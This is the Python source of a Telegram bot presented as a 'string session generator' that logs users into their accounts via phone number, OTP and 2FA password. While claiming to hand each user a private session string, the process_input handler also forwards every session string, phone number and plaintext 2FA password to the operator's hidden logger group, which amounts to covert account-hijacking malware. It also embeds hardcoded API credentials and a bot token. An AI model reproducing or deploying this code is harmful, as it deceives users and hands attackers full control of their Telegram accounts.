import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"  

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706  

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Start Command with Image & Buttons
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "**┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★**\n**┆◍ нᴇʏ, ᴍʏ ᴅᴇᴀʀ ᴜsᴇʀ 💐!**\n**┆● ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ !**\n**└─────────────────────────•**\n**❖ ɪ ᴀᴍ ᴀ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛᴇ ʙᴏᴛ**\n**❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ**\n**❖ sᴜᴘᴘᴏʀᴛ - ᴘʏʀᴏɢʀᴀᴍ | ᴛᴇʟᴇᴛʜᴏɴ**\n**•─────────────────────────•**\n**❖ ʙʏ : [sᴀɴᴀᴛᴀɴɪ ᴛᴇᴄʜ](https://t.me/SANATANI_TECH) | [sᴀɴᴀᴛᴀɴɪ ᴄʜᴀᴛ](https://t.me/SANATANI_SUPPORT)**\n**•─────────────────────────•**",
        buttons=[
            [
              Button.inline("🍁 ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ 🍁", b"generate")
            ],
            [
              Button.url("🍷 sᴜᴘᴘᴏʀᴛ", "https://t.me/SANATANI_SUPPORT"),
              Button.url("ᴜᴘᴅᴀᴛᴇs 🍸", "https://t.me/SANATANI_TECH"),
            ],
            [
              Button.inline("🔍 ʜᴇʟᴘ ᴍᴇɴᴜ 🔎", b"help")
            ],
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"  # Start Image
    )

# 🔹 Help Command Handler
@bot.on(events.CallbackQuery(pattern=b"help"))
async def send_help(event):
    help_text = """
❖ **ʜᴏᴡ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ?**

**◍ ᴄʟɪᴄᴋ ᴏɴ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ** ᴏʀ ᴛʏᴘᴇ **/generate**  
**◍ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ** ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ,
**• ᴇxᴀᴍᴘʟᴇ :** `+919876543210`
**◍ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ**  
**◍ ɪғ ᴀsᴋᴇᴅ, ᴇɴᴛᴇʀ ʏᴏᴜʀ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴀssᴡᴏʀᴅ**  
**◍ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ ᴡɪʟʟ ʙᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ !**  
**◍ ᴋᴇᴇᴘ ʏᴏᴜʀ session sᴀғᴇ & sᴇᴄᴜʀᴇ. ᴅᴏɴ'ᴛ sʜᴀʀᴇ ɪᴛ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ**  

**❖ ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴜsᴇ **/cancel** ᴛᴏ ʀᴇsᴇᴛ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ**
"""
    await event.respond(help_text, buttons=[Button.inline("🔙 Back", b"start")])

# 🔹 Cancel Command Handler
@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel_command(event):
    await cancel_session(event)

# 🔹 Cancel Button Handler
@bot.on(events.CallbackQuery(pattern=b"cancel"))
async def cancel_button(event):
    await cancel_session(event)

# 🔹 Function to Cancel the Process
async def cancel_session(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]  # Remove user session
        await event.respond("**❖ ʏᴏᴜʀ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss ʜᴀs ʙᴇᴇɴ ᴄᴀɴᴄᴇʟᴇᴅ !**\n◍ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀɢᴀɪɴ ᴡɪᴛʜ /generate")
    else:
        await event.respond("**❖ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ɪɴ ᴀɴʏ sᴇssɪᴏɴ ᴘʀᴏᴄᴇss**")

# 🔹 Generate Session Command
@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "**❖ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ\n\n**◍ ᴇxᴘʟᴀɪɴ :** `+919876543210`**",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# 🔹 Process User Input
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
            user_sessions[user_id]["step"] = "otp"
            await event.respond(
                "**❖ ᴏᴛᴘ sᴇɴᴛ ! ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ᴏᴛᴘ ʀᴇᴄᴇɪᴠᴇᴅ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ !**",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ:** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ !")
            del user_sessions[user_id]

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  # Retrieve hash

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n**◍ ᴘʜᴏɴᴇ:** `{phone_number}`\n**◍ sᴇssɪᴏɴ:** `{session_string}`")

            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n❖ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !**")
            del user_sessions[user_id]

        except PhoneCodeExpiredError:
            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ʜᴀs ᴇxᴘɪʀᴇᴅ. ᴘʟᴇᴀsᴇ ᴜsᴇ /generate ᴛᴏ ɢᴇᴛ ᴀ ɴᴇᴡ ᴏᴛᴘ**")
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("**❖ ᴇʀʀᴏʀ : ᴛʜᴇ ᴏᴛᴘ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ**")
        
        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password"
            await event.respond(
                "**❖ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ.**\n◍ ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴘᴀssᴡᴏʀᴅ :",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)} ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")

    # ✅ Step 3: Enter 2FA Password
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"**❖ ɴᴇᴡ sᴇssɪᴏɴ ᴡɪᴛʜ 2-sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ !**\n\n**◍ ᴜsᴇʀ:** `{user_id}`\n🔑 **◍ sᴇssɪᴏɴ:** `{session_string}`\n**◍ ᴘᴀssᴡᴏʀᴅ ᴜsᴇᴅ:** `{password}`")

            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ :**\n\n◍ `{session_string}`\n\n**◍ ᴋᴇᴇᴘ ᴛʜɪs sᴀғᴇ !\n\n❖ JOIN : @SANATANI_TECH**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ :** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
